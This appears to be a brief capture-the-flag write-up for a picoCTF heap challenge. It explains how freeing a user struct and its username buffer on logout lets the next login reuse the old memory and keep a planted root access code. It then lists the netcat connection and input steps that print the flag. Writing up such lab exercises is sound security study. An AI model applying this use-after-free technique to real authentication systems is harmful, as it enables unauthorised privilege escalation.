main init seems ok, zeroed the access_code array and set the username pointer to NULL to anom_user, (*files wasnt set). Then set u to point to anon_user;
the menu (); function just prints the commands and its descriptions
following these steps: login, logout, login. The "u = malloc(sizeof(struct user));" command alloc the same address to 'u' on the second 'login'

[anon]> login
  25
  12345678ROOT_ACCESS_CODE)
  u: 5555555596b0 (user struct)
  u->username: 5555555596e0 (char* username)
[12345678ROOT_ACCESS_CODE]> logout
  u: 5555555596b0 (user struct)
[anon]> login
  1
  u: 5555555596e0 (user struct)
  u->username: 555555559710 (char* username)

the problem here is that when logout:
  free(u);
  free(user);
the second free set the next malloc to where the username variable is stored, so when creating a new struct using malloc, the memory wont be changed, thus setting the access_code to ROOT_ACCESS_CODE


if the value of u->access_code [0] and u->access_code [1] are already stored on memory it will print the flag
steps to reproduce:
  nc jupiter.challenges.picoctf.org 53769
  login
  25
  12345678ROOT_ACCESS_CODE
  logout
  login
  1
  print-flag
